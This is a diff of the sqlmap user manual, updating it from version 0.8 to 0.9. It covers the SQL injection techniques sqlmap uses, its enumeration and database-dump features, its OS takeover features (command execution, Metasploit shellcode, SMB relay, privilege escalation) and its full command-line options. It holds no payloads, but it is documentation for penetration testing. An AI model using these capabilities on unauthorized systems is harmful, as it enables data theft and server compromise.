@@ -179,8 +179,8 @@ sqlmap is able to detect and exploit five SQL injection families:
 
 <itemize>
 <item><bf>Boolean-based blind SQL injection</bf>, also known as <bf>inferential
-SQL injection</bf>: sqlmap appends to the affected parameter in the HTTP
-request, a syntatically valid SQL statement string containing a
+SQL injection</bf>: sqlmap replaces or appends to the affected parameter in
+the HTTP request, a syntatically valid SQL statement string containing a
 <tt>SELECT</tt> sub-statement, or any other SQL statement whose the user
 want to retrieve the output.
 For each HTTP response, by making a comparison between the HTTP response
@@ -191,6 +191,15 @@ The bisection algorithm implemented in sqlmap to perform this technique
 is able to fetch each character of the output with a maximum of seven HTTP
 requests. Where the output is not within the clear-text plain charset,
 sqlmap will adapt the algorithm with bigger ranges to detect the output.
+<item><bf>Time-based blind SQL injection</bf>, also known as <bf>full blind
+SQL injection</bf>: sqlmap replaces or appends to the affected parameter in
+the HTTP request, a syntatically valid SQL statement string containing a
+query which put on hold the back-end DBMS to return for a certain number
+of seconds.
+For each HTTP response, by making a comparison between the HTTP response
+time with the original request, the tool inference the output of
+the injected statement character by character. Like for boolean-based
+technique, the bisection algorithm is applied.
 <item><bf>Error-based SQL injection</bf>: sqlmap replaces or append to the
 affected parameter a database-specific syntatically wrong statement and
 parses the HTTP response headers and body in search of DBMS error messages
@@ -220,11 +229,224 @@ execution depending on the underlying back-end database management system
 and the session user privileges.
 </itemize>
 
+
 <sect1>Demo
 
 <p>
 You can watch several demo videos, they are hosted on <htmlurl
 url="http://www.youtube.com/user/inquisb#g/u" name="YouTube">.
+
+
+<sect>Features
+
+<p>
+TODO: Features implemented in sqlmap include:
+
+
+<sect1>Generic features
+
+<p>
+<itemize>
+<item>Full support for <bf>MySQL</bf>, <bf>Oracle</bf>, <bf>PostgreSQL</bf>,
+<bf>Microsoft SQL Server</bf>, <bf>Microsoft Access</bf>, <bf>SQLite</bf>,
+<bf>Firebird</bf>, <bf>Sybase</bf> and <bf>SAP MaxDB</bf> database
+management systems.
+
+<item>Full support for five SQL injection techniques: <bf>boolean-based
+blind</bf>, <bf>time-based blind</bf>, <bf>error-based</bf>,
+<bf>UNION query</bf> and <bf>stacked queries</bf>.
+
+<item>It is possible to provide a single target URL, get the list of
+targets from <htmlurl url="http://portswigger.net/suite/" name="Burp proxy">
+requests log file or
+<htmlurl url="http://www.owasp.org/index.php/Category:OWASP_WebScarab_Project"
+name="WebScarab proxy"> <tt>conversations/</tt> folder, get the whole HTTP
+request from a text file or get the list of targets by providing sqlmap
+with a Google dork which queries <htmlurl url="http://www.google.com"
+name="Google"> search engine and parses its results page. You can also
+define a regular-expression based scope that is used to identify which of
+the parsed addresses to test.
+
+<item>Tests provided <bf>GET</bf> parameters, <bf>POST</bf> parameters,
+HTTP <bf>Cookie</bf> header values, HTTP <bf>User-Agent</bf> header value
+and HTTP <bf>Referer</bf> header value to find the dynamic ones, which means
+those that vary the HTTP response page content.
+On the dynamic ones sqlmap automatically tests and detects the ones
+affected by SQL injection. Each dynamic parameter is tested for
+<em>numeric</em>, <em>single quoted string</em>, <em>double quoted
+string</em> and all of these three data-types with zero to two parenthesis
+to correctly detect which is the <tt>SELECT</tt> statement syntax to
+perform further injections with. It is also possible to specify the only
+parameter(s) that you want to perform tests and use for injection on.
+
+<item>Option to specify the <bf>maximum number of concurrent HTTP
+requests</bf> to speed up the inferential blind SQL injection algorithms
+(multi-threading). It is also possible to specify the number of seconds to
+wait between each HTTP request.
+
+<item><bf>HTTP <tt>Cookie</tt> header</bf> string support, useful when the
+web application requires authentication based upon cookies and you have
+such data or in case you just want to test for and exploit SQL injection
+on such header. You can also specify to always URL-encode the Cookie
+header.
+
+<item>Automatically handle <bf>HTTP <tt>Set-Cookie</tt> header</bf> from
+the application, re-establishing of the session if it expires. Test and
+exploit on these values is supported too. You can also force to ignore any
+<tt>Set-Cookie</tt> header.
+
+<item><bf>HTTP Basic, Digest, NTLM and Certificate authentications</bf>
+support.
+
+<item><bf>Anonymous HTTP proxy</bf> support to pass by the requests to the
+target application that works also with HTTPS requests.
+
+<item>Options to fake the <bf>HTTP <tt>Referer</tt> header</bf> value and
+the <bf>HTTP <tt>User-Agent</tt> header</bf> value specified by user or
+randomly selected from a text file.
+
+<item>Support to increase the <bf>verbosity level of output messages</bf>:
+there exist <bf>six levels</bf>. The default level is <bf>1</bf> in which
+information, warnings, errors and tracebacks (if any occur) will be shown.
+
+<item>Granularity in the user's options.
+
+<item><bf>Estimated time of arrival</bf> support for each query, updated
+in real time while fetching the information to give to the user an
+overview on how long it will take to retrieve the output.
+
+<item>Automatic support to save the session (queries and their output,
+even if partially retrieved) in real time while fetching the data on a
+text file and <bf>resume the injection from this file in a second
+time</bf>.
+
+<item>Support to read options from a configuration INI file rather than
+specify each time all of the options on the command line. Support also to
+save command line options on a configuration INI file.
+
+<item>Option to update sqlmap as a whole to the latest development version
+from the Subversion repository.
+
+<item>Integration with other IT security open source projects,
+<htmlurl url="http://metasploit.com/framework/" name="Metasploit"> and <htmlurl
+url="http://w3af.sourceforge.net/" name="w3af">.
+</itemize>
+
+
+<sect1>Fingerprint and enumeration features
+
+<p>
+<itemize>
+<item><bf>Extensive back-end database software version and underlying
+operating system fingerprint</bf> based upon
+<htmlurl url="http://bernardodamele.blogspot.com/2007/06/database-management-system-fingerprint.html" name="inband error messages">,
+<htmlurl url="http://bernardodamele.blogspot.com/2007/06/database-management-system-fingerprint.html" name="banner parsing">,
+<htmlurl url="http://bernardodamele.blogspot.com/2007/07/more-on-database-management-system.html" name="functions output comparison"> and
+<htmlurl url="http://bernardodamele.blogspot.com/2007/07/more-on-database-management-system.html" name="specific features">
+such as MySQL comment injection. It is also possible to force the back-end
+database management system name if you already know it.
+
+<item>Basic web server software and web application technology fingerprint.
+
+<item>Support to retrieve the DBMS <bf>banner</bf>, <bf>session user</bf>
+and <bf>current database</bf> information. The tool can also check if the
+session user is a database administrator (DBA).
+
+<item>Support to enumerate <bf>database users</bf>, <bf>users' password
+hashes</bf>, <bf>users' privileges</bf>, <bf>databases</bf>,
+<bf>tables</bf> and <bf>columns</bf>.
+
+<item>Support to <bf>dump database tables</bf> as a whole or a range of
+entries as per user's choice. The user can also choose to dump only
+specific column(s).
+
+<item>Support to automatically dump <bf>all</bf> databases' schemas and
+entries. It is possibly to exclude from the dump the system databases.
+
+<item>Support to enumerate and dump <bf>all databases' tables containing user
+provided column(s)</bf>. Useful to identify for instance tables containing
+custom application credentials.
+
+<item>Support to <bf>run custom SQL statement(s)</bf> as in an interactive
+SQL client connecting to the back-end database. sqlmap automatically
+dissects the provided statement, determines which technique to use to
+inject it and how to pack the SQL payload accordingly.
+</itemize>
+
+
+<sect1>Takeover features
+
+<p>
+Some of these techniques are detailed in the white paper
+<htmlurl url="http://sqlmap.sourceforge.net/doc/BlackHat-Europe-09-Damele-A-G-Advanced-SQL-injection-whitepaper.pdf"
+name="Advanced SQL injection to operating system full control"> and in the
+slide deck <htmlurl url="http://www.slideshare.net/inquis/expanding-the-control-over-the-operating-system-from-the-database"
+name="Expanding the control over the operating system from the database">.
+
+<itemize>
+<item>Support to <bf>inject custom user-defined functions</bf>: the user
+can compile shared object then use sqlmap to create within the back-end
+DBMS user-defined functions out of the compiled shared object file. These
+UDFs can then be executed, and optionally removed, via sqlmap too.
+
+<item>Support to <bf>read and upload any file</bf> from the database
+server underlying file system when the database software is MySQL,
+PostgreSQL or Microsoft SQL Server.
+
+<item>Support to <bf>execute arbitrary commands and retrieve their
+standard output</bf> on the database server underlying operating system
+when the database software is MySQL, PostgreSQL or Microsoft SQL Server.
+<itemize>
+<item>On MySQL and PostgreSQL via user-defined function injection and
+execution.
+<item>On Microsoft SQL Server via <tt>xp_cmdshell()</tt> stored procedure.
+Also, the stored procedure is re-enabled if disabled or created from
+scratch if removed.
+</itemize>
+
+<item>Support to <bf>establish an out-of-band stateful TCP connection
+between the user machine and the database server</bf> underlying operating
+system. This channel can be an interactive command prompt, a Meterpreter
+session or a graphical user interface (VNC) session as per user's choice.
+sqlmap relies on Metasploit to create the shellcode and implements four
+different techniques to execute it on the database server. These
+techniques are:
+<itemize>
+<item>Database <bf>in-memory execution of the Metasploit's shellcode</bf>
+via sqlmap own user-defined function <tt>sys_bineval()</tt>. Supported on
+MySQL and PostgreSQL.
+<item>Upload and execution of a Metasploit's <bf>stand-alone payload
+stager</bf> via sqlmap own user-defined function <tt>sys_exec()</tt> on
+MySQL and PostgreSQL or via <tt>xp_cmdshell()</tt> on Microsoft SQL
+Server.
+<item>Execution of Metasploit's shellcode by performing a <bf>SMB
+reflection attack</bf> (<htmlurl
+url="http://www.microsoft.com/technet/security/Bulletin/MS08-068.mspx"
+name="MS08-068">) with a UNC path request from the database server to
+the user's machine where the Metasploit <tt>smb_relay</tt> server exploit
+runs.
+<item>Database in-memory execution of the Metasploit's shellcode by
+exploiting <bf>Microsoft SQL Server 2000 and 2005
+<tt>sp_replwritetovarbin</tt> stored procedure heap-based buffer
+overflow</bf> (<htmlurl
+url="http://www.microsoft.com/technet/security/bulletin/ms09-004.mspx"
+name="MS09-004">) with automatic DEP bypass.
+</itemize>
+
+<item>Support for <bf>database process' user privilege escalation</bf> via
+Metasploit's <tt>getsystem</tt> command which include, among others,
+the <htmlurl
+url="http://archives.neohapsis.com/archives/fulldisclosure/2010-01/0346.html"
+name="kitrap0d"> technique (<htmlurl
+url="http://www.microsoft.com/technet/security/bulletin/ms10-015.mspx"
+name="MS10-015">) or via <htmlurl
+url="http://labs.mwrinfosecurity.com/files/Publications/mwri_security-implications-of-windows-access-tokens_2008-04-14.pdf"
+name="Windows Access Tokens insecure design"> by using Meterpreter's
+<tt>incognito</tt> extension.
+
+<item>Support to access (read/add/delete) Windows registry hives.
+</itemize>
+
 
 <sect1>History
 
@@ -465,250 +687,23 @@ limited support for MySQL added.
 </itemize>
 
 
-<sect>Features
-
-<p>
-Features implemented in sqlmap include:
-
-
-<sect1>Generic features
-
-<p>
-<itemize>
-<item>Full support for <bf>MySQL</bf>, <bf>Oracle</bf>, <bf>PostgreSQL</bf>
-and <bf>Microsoft SQL Server</bf> back-end database management systems.
-Besides these four database management systems software, sqlmap can also
-identify Microsoft Access, DB2, Informix, Sybase and Interbase.
-
-<item>Full support for three SQL injection techniques: <bf> inferential
-blind SQL injection</bf>, <bf>UNION query (inband) SQL injection</bf> and
-<bf>batched queries support</bf>. sqlmap can also test for <bf>time based
-blind SQL injection</bf>.
-
-<item>It is possible to provide a single target URL, get the list of
-targets from <htmlurl url="http://portswigger.net/suite/" name="Burp proxy">
-requests log file or
-<htmlurl url="http://www.owasp.org/index.php/Category:OWASP_WebScarab_Project"
-name="WebScarab proxy"> <tt>conversations/</tt> folder, get the whole HTTP
-request from a text file or get the list of targets by providing sqlmap
-with a Google dork which queries <htmlurl url="http://www.google.com"
-name="Google"> search engine and parses its results page. You can also
-define a regular-expression based scope that is used to identify which of
-the parsed addresses to test.
-
-<item>Automatically tests all provided <bf>GET</bf> parameters,
-<bf>POST</bf> parameters, HTTP <bf>Cookie</bf> header values and HTTP
-<bf>User-Agent</bf> header value to find the dynamic ones, which means
-those that vary the HTTP response page content.
-On the dynamic ones sqlmap automatically tests and detects the ones
-affected by SQL injection. Each dynamic parameter is tested for
-<em>numeric</em>, <em>single quoted string</em>, <em>double quoted
-string</em> and all of these three data-types with zero to two parenthesis
-to correctly detect which is the <tt>SELECT</tt> statement syntax to
-perform further injections with. It is also possible to specify the only
-parameter(s) that you want to perform tests and use for injection on.
-
-<item>Option to specify the <bf>maximum number of concurrent HTTP
-requests</bf> to speed up the inferential blind SQL injection algorithms
-(multi-threading). It is also possible to specify the number of seconds to
-wait between each HTTP request.
-
-<item><bf>HTTP <tt>Cookie</tt> header</bf> string support, useful when the
-web application requires authentication based upon cookies and you have
-such data or in case you just want to test for and exploit SQL injection
-on such header. You can also specify to always URL-encode the Cookie
-header.
-
-<item>Automatically handle <bf>HTTP <tt>Set-Cookie</tt> header</bf> from
-the application, re-establishing of the session if it expires. Test and
-exploit on these values is supported too. You can also force to ignore any
-<tt>Set-Cookie</tt> header.
-
-<item><bf>HTTP Basic, Digest, NTLM and Certificate authentications</bf>
-support.
-
-<item><bf>Anonymous HTTP proxy</bf> support to pass by the requests to the
-target application that works also with HTTPS requests.
-
-<item>Options to fake the <bf>HTTP <tt>Referer</tt> header</bf> value and
-the <bf>HTTP <tt>User-Agent</tt> header</bf> value specified by user or
-randomly selected from a text file.
-
-<item>Support to increase the <bf>verbosity level of output messages</bf>:
-there exist <bf>six levels</bf>. The default level is <bf>1</bf> in which
-information, warnings, errors and tracebacks (if any occur) will be shown.
-
-<item>Granularity in the user's options.
-
-<item><bf>Estimated time of arrival</bf> support for each query, updated
-in real time while fetching the information to give to the user an
-overview on how long it will take to retrieve the output.
-
-<item>Automatic support to save the session (queries and their output,
-even if partially retrieved) in real time while fetching the data on a
-text file and <bf>resume the injection from this file in a second
-time</bf>.
-
-<item>Support to read options from a configuration INI file rather than
-specify each time all of the options on the command line. Support also to
-save command line options on a configuration INI file.
-
-<item>Option to update sqlmap as a whole to the latest development version
-from the Subversion repository.
-
-<item>Integration with other IT security open source projects,
-<htmlurl url="http://metasploit.com/framework/" name="Metasploit"> and <htmlurl
-url="http://w3af.sourceforge.net/" name="w3af">.
-</itemize>
-
-
-<sect1>Fingerprint and enumeration features
-
-<p>
-<itemize>
-<item><bf>Extensive back-end database software version and underlying
-operating system fingerprint</bf> based upon
-<htmlurl url="http://bernardodamele.blogspot.com/2007/06/database-management-system-fingerprint.html" name="inband error messages">,
-<htmlurl url="http://bernardodamele.blogspot.com/2007/06/database-management-system-fingerprint.html" name="banner parsing">,
-<htmlurl url="http://bernardodamele.blogspot.com/2007/07/more-on-database-management-system.html" name="functions output comparison"> and
-<htmlurl url="http://bernardodamele.blogspot.com/2007/07/more-on-database-management-system.html" name="specific features">
-such as MySQL comment injection. It is also possible to force the back-end
-database management system name if you already know it.
-
-<item>Basic web server software and web application technology fingerprint.
-
-<item>Support to retrieve the DBMS <bf>banner</bf>, <bf>session user</bf>
-and <bf>current database</bf> information. The tool can also check if the
-session user is a database administrator (DBA).
-
-<item>Support to enumerate <bf>database users</bf>, <bf>users' password
-hashes</bf>, <bf>users' privileges</bf>, <bf>databases</bf>,
-<bf>tables</bf> and <bf>columns</bf>.
-
-<item>Support to <bf>dump database tables</bf> as a whole or a range of
-entries as per user's choice. The user can also choose to dump only
-specific column(s).
-
-<item>Support to automatically dump <bf>all</bf> databases' schemas and
-entries. It is possibly to exclude from the dump the system databases.
-
-<item>Support to enumerate and dump <bf>all databases' tables containing user
-provided column(s)</bf>. Useful to identify for instance tables containing
-custom application credentials.
-
-<item>Support to <bf>run custom SQL statement(s)</bf> as in an interactive
-SQL client connecting to the back-end database. sqlmap automatically
-dissects the provided statement, determines which technique to use to
-inject it and how to pack the SQL payload accordingly.
-</itemize>
-
-
-<sect1>Takeover features
-
-<p>
-Some of these techniques are detailed in the white paper
-<htmlurl url="http://sqlmap.sourceforge.net/doc/BlackHat-Europe-09-Damele-A-G-Advanced-SQL-injection-whitepaper.pdf"
-name="Advanced SQL injection to operating system full control"> and in the
-slide deck <htmlurl url="http://www.slideshare.net/inquis/expanding-the-control-over-the-operating-system-from-the-database"
-name="Expanding the control over the operating system from the database">.
-
-<itemize>
-<item>Support to <bf>inject custom user-defined functions</bf>: the user
-can compile shared object then use sqlmap to create within the back-end
-DBMS user-defined functions out of the compiled shared object file. These
-UDFs can then be executed, and optionally removed, via sqlmap too.
-
-<item>Support to <bf>read and upload any file</bf> from the database
-server underlying file system when the database software is MySQL,
-PostgreSQL or Microsoft SQL Server.
-
-<item>Support to <bf>execute arbitrary commands and retrieve their
-standard output</bf> on the database server underlying operating system
-when the database software is MySQL, PostgreSQL or Microsoft SQL Server.
-<itemize>
-<item>On MySQL and PostgreSQL via user-defined function injection and
-execution.
-<item>On Microsoft SQL Server via <tt>xp_cmdshell()</tt> stored procedure.
-Also, the stored procedure is re-enabled if disabled or created from
-scratch if removed.
-</itemize>
-
-<item>Support to <bf>establish an out-of-band stateful TCP connection
-between the user machine and the database server</bf> underlying operating
-system. This channel can be an interactive command prompt, a Meterpreter
-session or a graphical user interface (VNC) session as per user's choice.
-sqlmap relies on Metasploit to create the shellcode and implements four
-different techniques to execute it on the database server. These
-techniques are:
-<itemize>
-<item>Database <bf>in-memory execution of the Metasploit's shellcode</bf>
-via sqlmap own user-defined function <tt>sys_bineval()</tt>. Supported on
-MySQL and PostgreSQL.
-<item>Upload and execution of a Metasploit's <bf>stand-alone payload
-stager</bf> via sqlmap own user-defined function <tt>sys_exec()</tt> on
-MySQL and PostgreSQL or via <tt>xp_cmdshell()</tt> on Microsoft SQL
-Server.
-<item>Execution of Metasploit's shellcode by performing a <bf>SMB
-reflection attack</bf> (<htmlurl
-url="http://www.microsoft.com/technet/security/Bulletin/MS08-068.mspx"
-name="MS08-068">) with a UNC path request from the database server to
-the user's machine where the Metasploit <tt>smb_relay</tt> server exploit
-runs.
-<item>Database in-memory execution of the Metasploit's shellcode by
-exploiting <bf>Microsoft SQL Server 2000 and 2005
-<tt>sp_replwritetovarbin</tt> stored procedure heap-based buffer
-overflow</bf> (<htmlurl
-url="http://www.microsoft.com/technet/security/bulletin/ms09-004.mspx"
-name="MS09-004">) with automatic DEP bypass.
-</itemize>
-
-<item>Support for <bf>database process' user privilege escalation</bf> via
-Metasploit's <tt>getsystem</tt> command which include, among others,
-the <htmlurl
-url="http://archives.neohapsis.com/archives/fulldisclosure/2010-01/0346.html"
-name="kitrap0d"> technique (<htmlurl
-url="http://www.microsoft.com/technet/security/bulletin/ms10-015.mspx"
-name="MS10-015">) or via <htmlurl
-url="http://labs.mwrinfosecurity.com/files/Publications/mwri_security-implications-of-windows-access-tokens_2008-04-14.pdf"
-name="Windows Access Tokens insecure design"> by using Meterpreter's
-<tt>incognito</tt> extension.
-
-<item>Support to access (read/add/delete) Windows registry hives.
-</itemize>
-
-
 <sect>Download and update
 
 <p>
 sqlmap can be downloaded from its
 <htmlurl url="http://sourceforge.net/projects/sqlmap/files/" name="SourceForge File List page">.
-It is available in various formats:
+It is available in two formats:
 
 <itemize>
-<item><htmlurl url="http://downloads.sourceforge.net/sqlmap/sqlmap-0.8.tar.gz"
-name="Source gzip compressed"> operating system independent.
+<item><htmlurl url="http://downloads.sourceforge.net/sqlmap/sqlmap-0.9.tar.gz"
+name="Source gzip compressed">.
 
-<item><htmlurl url="http://downloads.sourceforge.net/sqlmap/sqlmap-0.8.tar.bz2"
-name="Source bzip2 compressed"> operating system independent.
-
-<item><htmlurl url="http://downloads.sourceforge.net/sqlmap/sqlmap-0.8.zip"
-name="Source zip compressed"> operating system independent.
-
-<item><htmlurl url="http://downloads.sourceforge.net/sqlmap/sqlmap_0.8-1_all.deb"
-name="DEB binary package"> architecture independent for Debian and any
-other Debian derivated GNU/Linux distribution.
-
-<item><htmlurl url="http://downloads.sourceforge.net/sqlmap/sqlmap-0.8-1.noarch.rpm"
-name="RPM binary package"> architecture independent for Fedora and any
-other operating system that can install RPM packages.
-
-<item><htmlurl url="http://downloads.sourceforge.net/sqlmap/sqlmap-0.8_exe.zip"
-name="Portable executable for Windows"> that <bf>does not require the Python
-interpreter</bf> to be installed on the operating system.
+<item><htmlurl url="http://downloads.sourceforge.net/sqlmap/sqlmap-0.9.zip"
+name="Source zip compressed">.
 </itemize>
 
 <p>
-You can also checkout the latest development version from the sqlmap
+You can also checkout the latest development version from the
 <htmlurl url="https://svn.sqlmap.org/sqlmap/trunk/sqlmap/" name="Subversion">
 repository:
 
@@ -717,9 +712,7 @@ $ svn checkout https://svn.sqlmap.org/sqlmap/trunk/sqlmap sqlmap-dev
 </verb></tscreen>
 
 <p>
-If you download a source package (gzip, bzip2 or zip) or sqlmap from the
-Subversion repository, you can update it to the latest development version
-anytime by running:
+You can update it to the latest development version anytime by running:
 
 <tscreen><verb>
 $ python sqlmap.py --update
@@ -732,29 +725,8 @@ $ svn update
 </verb></tscreen>
 
 <p>
-Viceversa if you download a binary package (deb, rpm or exe), the
-update feature is disabled.
-
-<p>
-There are some differences between the packages:
-
-<itemize>
-<item>The source packages (gzip, bzip2 and zip) have all features. They
-contains the working copy from the Subversion repository updated at the
-time the sqlmap new version has been released.
-<item>The Debian and Red Hat installation packages (deb and rpm) are
-compliant with the Linux distributions' packaging guidelines. This implies
-that they do not support the update features and do not include UPX (used
-to pack the Metasploit payload stager in some cases, see below).
-<item>The Windows binary package (exe) can't update itself and does not
-support the takeover out-of-band features because they rely on
-Metasploit's <tt>msfcli</tt> which is not available for Windows.
-</itemize>
-
-<p>
-It is therefore recommended to download any of the source packages and run
-it either from a shell like Bash on Unix and Mac OSX or from Cygwin on
-Windows.
+This is strongly recommended <bf>before</bf> reporting any bug to the 
+<htmlurl url="http://sqlmap.sourceforge.net/#ml" name="mailing list">.
 
 
 <sect>License and copyright
@@ -762,8 +734,7 @@ Windows.
 <p>
 sqlmap is released under the terms of the
 <htmlurl url="http://www.gnu.org/licenses/old-licenses/gpl-2.0.html" name="General Public License v2">.
-sqlmap is copyrighted by
-<htmlurl url="mailto:bernardo.damele@gmail.com" name="Bernardo Damele A. G.">.
+sqlmap is copyrighted by its <htmlurl url="http://sqlmap.sourceforge.net/#developers" name="developers">.
 
 
 <sect>Usage
@@ -772,20 +743,21 @@ sqlmap is copyrighted by
 <tscreen><verb>
 $ python sqlmap.py -h
 
-    sqlmap/0.8 - automatic SQL injection and database takeover tool
+    sqlmap/0.9 - automatic SQL injection and database takeover tool
     http://sqlmap.sourceforge.net
-    
+
 Usage: sqlmap.py [options]
 
 Options:
   --version             show program's version number and exit
   -h, --help            show this help message and exit
-  -v VERBOSE            Verbosity level: 0-5 (default 1)
+  -v VERBOSE            Verbosity level: 0-6 (default 1)
 
   Target:
     At least one of these options has to be specified to set the source to
     get target urls from.
 
+    -d DIRECT           Direct connection to the database
     -u URL, --url=URL   Target url
     -l LIST             Parse targets from Burp or WebScarab proxy logs
     -r REQUESTFILE      Load HTTP request from a file
@@ -795,53 +767,66 @@ Options:
   Request:
     These options can be used to specify how to connect to the target url.
 
-    --method=METHOD     HTTP method, GET or POST (default GET)
     --data=DATA         Data string to be sent through POST
     --cookie=COOKIE     HTTP Cookie header
     --cookie-urlencode  URL Encode generated cookie injections
     --drop-set-cookie   Ignore Set-Cookie header from response
     --user-agent=AGENT  HTTP User-Agent header
-    -a USERAGENTSFILE   Load a random HTTP User-Agent header from file
+    --random-agent      Use randomly selected HTTP User-Agent header
     --referer=REFERER   HTTP Referer header
     --headers=HEADERS   Extra HTTP headers newline separated
     --auth-type=ATYPE   HTTP authentication type (Basic, Digest or NTLM)
     --auth-cred=ACRED   HTTP authentication credentials (name:password)
     --auth-cert=ACERT   HTTP authentication certificate (key_file,cert_file)
     --proxy=PROXY       Use a HTTP proxy to connect to the target url
+    --proxy-cred=PCRED  HTTP proxy authentication credentials (name:password)
     --ignore-proxy      Ignore system default HTTP proxy
-    --threads=THREADS   Maximum number of concurrent HTTP requests (default 1)
     --delay=DELAY       Delay in seconds between each HTTP request
     --timeout=TIMEOUT   Seconds to wait before timeout connection (default 30)
     --retries=RETRIES   Retries when the connection timeouts (default 3)
     --scope=SCOPE       Regexp to filter targets from provided proxy log
+    --safe-url=SAFURL   Url address to visit frequently during testing
+    --safe-freq=SAFREQ  Test requests between two visits to a given safe url
+
+  Optimization:
+    These options can be used to optimize the performance of sqlmap.
+
+    -o                  Turn on all optimization switches
+    --predict-output    Predict common queries output
+    --keep-alive        Use persistent HTTP(s) connections
+    --null-connection   Retrieve page length without actual HTTP response body
+    --threads=THREADS   Max number of concurrent HTTP(s) requests (default 1)
+    --group-concat      Use GROUP_CONCAT MySQL technique in dumping phase
 
   Injection:
     These options can be used to specify which parameters to test for,
-    provide custom injection payloads and how to parse and compare HTTP
-    responses page content when using the blind SQL injection technique.
+    provide custom injection payloads and optional tampering scripts.
 
     -p TESTPARAMETER    Testable parameter(s)
     --dbms=DBMS         Force back-end DBMS to this value
     --os=OS             Force back-end DBMS operating system to this value
     --prefix=PREFIX     Injection payload prefix string
-    --postfix=POSTFIX   Injection payload postfix string
+    --suffix=SUFFIX     Injection payload suffix string
+    --tamper=TAMPER     Use given script(s) for tampering injection data
+
+  Detection:
+    These options can be used to specify how to parse and compare page
+    content from HTTP responses when using blind SQL injection technique.
+
+    --level=LEVEL       Level of tests to perform (1-5, default 1)
+    --risk=RISK         Risk of tests to perform (0-3, default 1)
     --string=STRING     String to match in page when the query is valid
     --regexp=REGEXP     Regexp to match in page when the query is valid
-    --excl-str=ESTRING  String to be excluded before comparing page contents
-    --excl-reg=EREGEXP  Matches to be excluded before comparing page contents
+    --text-only         Compare pages based only on their textual content
 
   Techniques:
     These options can be used to test for specific SQL injection technique
     or to use one of them to exploit the affected parameter(s) rather than
     using the default blind SQL injection technique.
 
-    --stacked-test      Test for stacked queries (multiple statements) support
-    --time-test         Test for time based blind SQL injection
     --time-sec=TIMESEC  Seconds to delay the DBMS response (default 5)
-    --union-test        Test for UNION query (inband) SQL injection
-    --union-tech=UTECH  Technique to test for UNION query SQL injection
-    --union-use         Use the UNION query (inband) SQL injection to retrieve
-                        the queries output. No need to go blind
+    --union-cols=UCOLS  Range of columns to test for UNION query SQL injection
+    --union-char=UCHAR  Character to use to bruteforce number of columns
 
   Fingerprint:
     -f, --fingerprint   Perform an extensive DBMS version fingerprint
@@ -858,15 +843,17 @@ Options:
     --users             Enumerate DBMS users
     --passwords         Enumerate DBMS users password hashes
     --privileges        Enumerate DBMS users privileges
+    --roles             Enumerate DBMS users roles
     --dbs               Enumerate DBMS databases
     --tables            Enumerate DBMS database tables
     --columns           Enumerate DBMS database table columns
     --dump              Dump DBMS database table entries
     --dump-all          Dump all DBMS databases tables entries
-    -D DB  <item> database to enumerate
-    -T TBL <item> database table to enumerate
-    -C COL <item> database table column to enumerate
-    -U USER<item> user to enumerate
+    --search            Search column(s), table(s) and/or database name(s)
+    -D DB               DBMS database to enumerate
+    -T TBL              DBMS database table to enumerate
+    -C COL              DBMS database table column to enumerate
+    -U USER             DBMS user to enumerate
     --exclude-sysdbs    Exclude DBMS system databases when enumerating tables
     --start=LIMITSTART  First query output entry to retrieve
     --stop=LIMITSTOP    Last query output entry to retrieve
@@ -874,6 +861,12 @@ Options:
     --last=LASTCHAR     Last query output word character to retrieve
     --sql-query=QUERY   SQL statement to be executed
     --sql-shell         Prompt for an interactive SQL shell
+
+  Brute force:
+    These options can be used to run brute force checks.
+
+    --common-tables     Check existence of common tables
+    --common-columns    Check existence of common columns
 
   User-defined function injection:
     These options can be used to create custom user-defined functions.
@@ -885,9 +878,9 @@ Options:
     These options can be used to access the back-end database management
     system underlying file system.
 
-    --read-file=RFILE   Read a file from the back-end DBMS file system
-    --write-file=WFILE  Write a local file on the back-end DBMS file system
-    --dest-file=DFILE   Back-end DBMS absolute filepath to write to
+    --file-read=RFILE   Read a file from the back-end DBMS file system
+    --file-write=WFILE  Write a local file on the back-end DBMS file system
+    --file-dest=DFILE   Back-end DBMS absolute filepath to write to
 
   Operating system access:
     These options can be used to access the back-end database management
@@ -914,312 +907,88 @@ Options:
     --reg-data=REGDATA  Windows registry key value data
     --reg-type=REGTYPE  Windows registry key value type
 
-  Miscellaneous:
+  General:
+    These options can be used to set some general working parameters.
+
+    -x XMLFILE          Dump the data into an XML file
     -s SESSIONFILE      Save and resume all data retrieved on a session file
+    -t TRAFFICFILE      Log all HTTP traffic into a textual file
     --flush-session     Flush session file for current target
     --eta               Display for each output the estimated time of arrival
-    --gpage=GOOGLEPAGE  Use google dork results from specified page number
     --update            Update sqlmap
     --save              Save options on a configuration INI file
     --batch             Never ask for user input, use the default behaviour
+
+  Miscellaneous:
+    --beep              Alert when sql injection found
+    --check-payload     IDS detection testing of injection payload
     --cleanup           Clean up the DBMS by sqlmap specific UDF and tables
+    --forms             Parse and test forms on target url
+    --gpage=GOOGLEPAGE  Use google dork results from specified page number
+    --parse-errors      Parse DBMS error messages from response pages
+    --replicate         Replicate dumped data into a sqlite3 database
 </verb></tscreen>
 
 
 <sect1>Output verbosity
 
 <p>
-Option: <tt>-v</tt>
+Switch: <tt>-v</tt>
 
 <p>
-Verbose options can be used to set the verbosity level of output messages.
-There exist six levels.
-The default level is <bf>1</bf> in which
-information, warnings, errors and tracebacks (if any occur) will be shown.
-Level <bf>2</bf> shows also debug messages, level <bf>3</bf> shows also
-full HTTP requests, level <bf>4</bf> shows also HTTP responses headers and
-level <bf>5</bf> shows also HTTP responses page content.
+This switch can be used to set the verbosity level of output messages.
+There exist <bf>seven</bf> levels of verbosity.
+The default level is <bf>1</bf> in which information, warnings, errors, critical messages and Python tracebacks (if any occur) will be displayed.
+
+<itemize>
+<item><tt>0</tt>: Show only critical messages
+<item><tt>1</tt>: Show also warning and information messages
+<item><tt>2</tt>: Show also debug messages
+<item><tt>3</tt>: Show also payloads injected
+<item><tt>4</tt>: Show also HTTP requests
+<item><tt>5</tt>: Show also HTTP responses' headers
+<item><tt>6</tt>: Show also HTTP responses' page content
+</itemize>
 
 <p>
-Example on a <bf>MySQL 5.0.67</bf> target (verbosity level <bf>1</bf>):
-
-<tscreen><verb>
-$ python sqlmap.py -u "http://192.168.136.131/sqlmap/mysql/get_int.php?id=1" -v 1
-
-[hh:mm:58] [INFO] using '/home/inquis/sqlmap/output/192.168.136.131/session' as session file
-[hh:mm:58] [INFO] testing connection to the target url
-[hh:mm:58] [INFO] testing if the url is stable, wait a few seconds
-[hh:mm:59] [INFO] url is stable
-[hh:mm:59] [INFO] testing if User-Agent parameter 'User-Agent' is dynamic
-[hh:mm:59] [WARNING] User-Agent parameter 'User-Agent' is not dynamic
